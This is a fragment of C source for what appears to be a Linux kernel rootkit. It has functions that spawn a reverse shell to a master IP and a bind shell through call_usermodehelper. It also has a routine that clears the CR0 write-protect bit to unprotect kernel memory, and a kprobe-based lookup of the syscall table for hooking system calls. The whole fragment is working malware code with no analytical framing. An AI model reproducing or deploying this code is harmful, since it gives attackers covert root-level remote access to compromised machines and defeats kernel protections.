static inline char *n_kmalloc(ssize_t size)  {
	char *retme;
	
	retme = kzalloc((size + 1) * sizeof(char), GFP_KERNEL);
	
	return retme;
}

void bds_reverse_shell(struct work_struct *work) {
	int rc;     
	char* argv[] = {"/opt/bds_elf/bds_rr", MASTER_IP, NULL};

	rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

void bds_bindshell(struct work_struct *work) {
	int rc;     
        char* argv[] = {"/opt/bds_elf/bds_br",  NULL};

	rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static inline int atoi(char *str) {
        int res = 0, i;
	
        for (i = 0; str[i] >= '0' && str[i] <= '9'; ++i)
                res = 10 * res + str[i] - '0';
        return res;
}

static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}
    
static inline void protect_memory(void) {
    write_cr0_forced(cr0);
}

static inline void unprotect_memory(void) {
    write_cr0_forced(cr0 & ~0x00010000);
}

unsigned long *get_syscall_table(void) {
	unsigned long *syscall_table;
	
	#ifdef KPROBE_LOOKUP
		typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
		kallsyms_lookup_name_t kallsyms_lookup_name;
		register_kprobe(&kp);
		kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
		unregister_kprobe(&kp);
	#endif
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
		
	return syscall_table;
	
}
